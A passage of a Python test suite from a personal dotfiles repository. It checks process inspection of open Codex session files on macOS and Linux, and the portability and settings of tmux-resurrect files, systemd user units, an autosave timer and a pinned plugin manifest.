        home = Path(tempfile.mkdtemp(prefix=f"hook home {HANGUL} "))
        self.addCleanup(shutil.rmtree, home, True)
        lock = home / ".codex/thread-writer-locks" / f"{ID_B}.lock"
        rollout = home / ".codex/sessions/2026/10/11" / f"rollout-2026-10-11T09-00-00-{ID_A}.jsonl"
        for path in (lock, rollout):
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("")
        child, _ = self.spawn(HOLDER, str(lock), str(rollout))
        with mock.patch.dict(os.environ, {"HOME": str(home)}):
            locks, rollouts = MODULE.open_codex_ids(child.pid)
        self.assertEqual(locks, [ID_B])
        self.assertEqual(
            [(nfc(str(path)), value) for path, value in rollouts],
            [(nfc(os.path.realpath(rollout)), ID_A)],
        )

    def test_launcher_path_is_the_program_the_child_runs(self):
        child, _ = self.spawn(GRANDCHILD)
        path = MODULE.launcher_path(child.pid)
        self.assertTrue(path and os.path.isabs(path), path)
        self.assertTrue(os.path.samefile(path, MODULE.darwin_backend().exe(child.pid)))

    def test_self_test_passes(self):
        # Its child's empty arguments are kept on macOS and must be seen.
        stdout, stderr = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            status = MODULE.self_test()
        self.assertEqual(status, 0, stderr.getvalue())
        self.assertIn("process inspection works (libproc and sysctl)", stdout.getvalue())


@unittest.skipUnless(LINUX_PROC, "LinuxLibSystem answers from Linux's /proc")
class SimulatedDarwinHookTests(LiveHookScenarios, DarwinHookCase):
    """The hook's macOS code on Linux: the real installer/darwin_proc.py
    over LinuxLibSystem, which answers libproc's and sysctl's calls from
    /proc in macOS's layouts and conventions."""

    def setUp(self):
        DARWIN_PROC_TESTS.use_library(self, DARWIN_PROC_TESTS.LinuxLibSystem())
        self.use_darwin(darwin_proc)

    def tearDown(self):
        self.assertEqual(self.stderr.getvalue(), "")


@unittest.skipUnless(sys.platform == "darwin", "needs macOS libproc")
class DarwinHookTests(LiveHookScenarios, unittest.TestCase):
    """The same scenarios against the real libproc and sysctl."""

    def setUp(self):
        self.assertIsNotNone(MODULE.darwin_backend(warn=False), MODULE._darwin_problem)



SOURCE_USER_PATH = re.compile(r"/home/[A-Za-z0-9_.-]+|/Users/[A-Za-z0-9_.-]+")
RESTORE_FILES = (
    "tmux/tmux.conf",
    "tmux/resurrect.conf",
    "tmux/resurrect-save",
    "tmux/resurrect-ai-session.py",
    "systemd/user/tmux.service",
    "systemd/user/tmux-resurrect-autosave.service",
    "systemd/user/tmux-resurrect-autosave.timer",
    "manifests/tmux-plugins.json",
    "docs/tmux-auto-restore.ko.md",
)


# PLAT-1: the installer's tools directory (fd shim, fzf-preview.sh) first, as
# zsh/zshenv orders it, then the user and system bin directories.
UNIT_PATH = (
    "PATH=%h/.local/share/personal-dotfiles/bin:%h/.local/bin:"
    "/usr/local/bin:/usr/bin:/bin"
)


def unit_values(path: Path) -> dict[str, list[str]]:
    values: dict[str, list[str]] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        if not line or line.startswith(("#", ";", "[")):
            continue
        key, _, value = line.partition("=")
        values.setdefault(key.strip(), []).append(value.strip())
    return values


class PortableFilesTests(unittest.TestCase):
    def test_no_machine_specific_home_paths(self):
        for name in RESTORE_FILES:
            with self.subTest(name=name):
                text = (REPO_ROOT / name).read_text(encoding="utf-8")
                self.assertIsNone(SOURCE_USER_PATH.search(text))
                # DISPLAY=:0 appears only as tmux.service's documented fallback
                # for when the user manager never exports the desktop session.
                lines = [l for l in text.splitlines() if "DISPLAY=:0" in l]
                if name == "systemd/user/tmux.service":
                    self.assertEqual(lines, ["Environment=DISPLAY=:0"])
                else:
                    self.assertEqual(lines, [])
                # Generic reasons only; nothing about one machine's private setup.
                self.assertNotRegex(text.lower(), r"sidebar|workspace restore app")

    def test_scripts_are_executable(self):
        for name in ("tmux/resurrect-save", "tmux/resurrect-ai-session.py"):
            mode = (REPO_ROOT / name).stat().st_mode
            self.assertTrue(mode & stat.S_IXUSR, name)

    def test_login_unit_is_static_and_graphical(self):
        values = unit_values(REPO_ROOT / "systemd/user/tmux.service")
        # PLAT-2/REQ-3: after the desktop has exported WAYLAND_DISPLAY/DISPLAY
        # (graphical-session.target), not merely after graphical-session-pre.
        after = " ".join(values["After"]).split()
        self.assertIn("graphical-session.target", after)
        self.assertEqual(values["WantedBy"], ["graphical-session.target"])
        # Logging out of the desktop does not stop the server.
        self.assertNotIn("PartOf", values)
        self.assertNotIn("BindsTo", values)
        self.assertEqual(values["Environment"], [UNIT_PATH, "DISPLAY=:0"])
        tools = json.loads(
            (REPO_ROOT / "manifests/tools.json").read_text(encoding="utf-8")
        )
        self.assertIn(
            tools["bin_dir"].replace("{data_home}", "%h/.local/share"),
            UNIT_PATH.split("=", 1)[1].split(":"),
        )
        self.assertEqual(values["UnsetEnvironment"],
                         ["TMUX TMUX_PANE TMUX_SERVICE_TMUX TMUX_SERVICE_ENV_POLLS"])
        self.assertIn("! tmux has-session", values["ExecCondition"][0])
        # The wrapper waits for the desktop environment (and the Xwayland
        # cookie), then execs `tmux new-session -d -s __continuum_startup`.
        self.assertEqual(values["ExecStart"], ["%h/.dotfiles/tmux/tmux-service-start"])
        self.assertEqual(values["ExecStop"], [
            "-%h/.dotfiles/tmux/resurrect-save",
            "-/usr/bin/env tmux kill-server",
        ])

    def test_autosave_timer_runs_the_wrapper_every_minute(self):
        service = unit_values(
            REPO_ROOT / "systemd/user/tmux-resurrect-autosave.service"
        )
        timer = unit_values(REPO_ROOT / "systemd/user/tmux-resurrect-autosave.timer")
        self.assertEqual(service["ExecStart"], ["%h/.dotfiles/tmux/resurrect-save"])
        self.assertEqual(service["ExecCondition"], ["/usr/bin/env tmux has-session"])
        self.assertEqual(service["Environment"], [UNIT_PATH])
        # resurrect-save's "not restored yet" skip is not a unit failure.
        self.assertEqual(service["SuccessExitStatus"], ["75"])
        skip = re.search(
            r"^SKIPPED=(\d+)$",
            (REPO_ROOT / "tmux/resurrect-save").read_text(encoding="utf-8"),
            re.MULTILINE,
        )
        self.assertIsNotNone(skip)
        self.assertEqual(skip.group(1), "75")
        self.assertEqual(timer["OnUnitActiveSec"], ["1min"])
        self.assertEqual(timer["Unit"], ["tmux-resurrect-autosave.service"])
        self.assertEqual(timer["WantedBy"], ["timers.target"])

    def test_plugin_manifest_pins_every_declared_plugin(self):
        data = json.loads(
            (REPO_ROOT / "manifests/tmux-plugins.json").read_text(encoding="utf-8")
        )
        self.assertEqual(data["schema"], 1)
        names = [plugin["name"] for plugin in data["plugins"]]
        self.assertEqual(len(names), len(set(names)))
        for plugin in data["plugins"]:
            self.assertRegex(plugin["commit"], r"^[0-9a-f]{40}$")
            self.assertTrue(plugin["url"].startswith("https://github.com/"))
            self.assertEqual(plugin["url"].rstrip("/").rsplit("/", 1)[1], plugin["name"])
        declared = set()
        for name in ("tmux/tmux.conf", "tmux/resurrect.conf"):
            text = (REPO_ROOT / name).read_text(encoding="utf-8")
            declared.update(re.findall(
                r"^\s*set(?:-option)?\s+-g\s+@plugin\s+['\"]?[^/'\"\s]+/([^'\"\s]+)",
                text, re.MULTILINE,
            ))
        self.assertLessEqual(declared, set(names))


if __name__ == "__main__":
    unittest.main()
